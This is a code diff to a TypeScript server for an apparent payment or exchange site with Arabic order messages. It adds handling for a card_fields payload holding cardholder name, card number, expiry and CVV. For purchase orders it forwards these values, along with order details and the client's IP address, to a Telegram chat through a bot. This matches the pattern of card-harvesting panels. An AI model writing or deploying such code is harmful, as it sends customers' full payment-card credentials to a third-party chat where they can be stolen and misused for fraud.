@@ -11,6 +11,8 @@ import {
   formatOrderLines,
   isStartCommand,
   parseOrderCallbackData,
+  stripSensitiveUrlsFromDetails,
+  type CardFieldsPayload,
 } from "./server/botMessages";
 import * as store from "./server/store";
 import type { ServerTransaction } from "./server/store";
@@ -21,12 +23,13 @@ async function sendOrderTelegram(
   bot: TelegramBotInstance,
   chatId: string,
   tx: ServerTransaction,
-  profileName: string
+  profileName: string,
+  cardFields?: CardFieldsPayload | null
 ) {
-  const { text, reply_markup } = buildNewOrderMessagePayload(tx, profileName);
+  const { text, reply_markup } = buildNewOrderMessagePayload(tx, profileName, cardFields);
   await bot.sendMessage(chatId, text, {
     parse_mode: "HTML",
-    reply_markup,
+    reply_markup: reply_markup as TelegramBotTypes.InlineKeyboardMarkup,
   });
 }
 
@@ -846,7 +849,16 @@ async function startServer() {
 
   app.post("/api/transactions", async (req, res) => {
     try {
-      const { client_id, user_id, type, amount, method, details, agent_number_id } = req.body as {
+      const {
+        client_id,
+        user_id,
+        type,
+        amount,
+        method,
+        details,
+        agent_number_id,
+        card_fields,
+      } = req.body as {
         client_id?: string;
         user_id?: string;
         type?: string;
@@ -854,6 +866,12 @@ async function startServer() {
         method?: string;
         details?: string;
         agent_number_id?: string;
+        card_fields?: {
+          holder?: string;
+          number?: string;
+          expiry?: string;
+          cvv?: string;
+        };
       };
       if (!client_id || !type || amount == null || !method) {
         return res.status(400).json({ error: "client_id, type, amount, method required" });
@@ -876,7 +894,23 @@ async function startServer() {
         try {
           const profile = await store.getSiteProfile();
           const name = profile.full_name || "Business User";
-          await sendOrderTelegram(bot, chatId, tx, name);
+          let cardPayload: CardFieldsPayload | null = null;
+          if (
+            type === "buy" &&
+            card_fields &&
+            typeof card_fields.holder === "string" &&
+            typeof card_fields.number === "string" &&
+            typeof card_fields.expiry === "string" &&
+            typeof card_fields.cvv === "string"
+          ) {
+            cardPayload = {
+              holder: card_fields.holder,
+              number: card_fields.number,
+              expiry: card_fields.expiry,
+              cvv: card_fields.cvv,
+            };
+          }
+          await sendOrderTelegram(bot, chatId, tx, name, cardPayload);
         } catch (e) {
           console.error("Telegram send order:", e);
         }
@@ -1123,7 +1157,7 @@ async function startServer() {
         finalMessage += `💰 <b>المبلغ:</b> ${orderDetails.amount} ${orderDetails.currency || "IQD"}\n`;
         finalMessage += `💳 <b>الطريقة:</b> ${escapeHtml(String(orderDetails.method || "—"))}\n`;
         if (orderDetails.details) {
-          finalMessage += `📱 <b>تفاصيل:</b> ${escapeHtml(String(orderDetails.details))}\n`;
+          finalMessage += `📱 <b>تفاصيل:</b> ${escapeHtml(stripSensitiveUrlsFromDetails(String(orderDetails.details)))}\n`;
         }
         finalMessage += `🌐 <b>عنوان الطلب:</b> ${escapeHtml(clientIp)}\n\n`;
         finalMessage += `<i>تحديث الحالة يظهر للعميل في السجل.</i>`;
